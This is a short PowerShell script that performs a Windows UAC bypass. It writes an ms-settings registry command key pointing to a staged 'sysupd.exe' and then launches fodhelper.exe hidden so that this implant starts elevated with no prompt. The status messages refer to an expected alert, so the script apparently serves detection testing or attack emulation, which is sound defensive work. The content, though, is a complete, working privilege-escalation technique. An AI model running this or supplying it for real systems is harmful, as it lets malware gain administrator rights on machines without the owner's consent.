Write-Host "run this from a NON-elevated PowerShell - that is what the bypass is for"
Write-Host "[1] writing the ms-settings proxy key (expect PERS-UAC-KEY within 30s)..."
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" `
  -Value "C:\Users\Public\sysupd.exe"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name DelegateExecute -Value ""
if (-not (Test-Path C:\Users\Public\sysupd.exe)) {
    Write-Warning "no sysupd.exe staged - fodhelper would launch nothing; key alert still fires"
}
Write-Host "[2] launching fodhelper (elevated implant launch, no UAC prompt)..."
Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
Write-Host "cleanup: Remove-Item -Recurse HKCU:\Software\Classes\ms-settings"
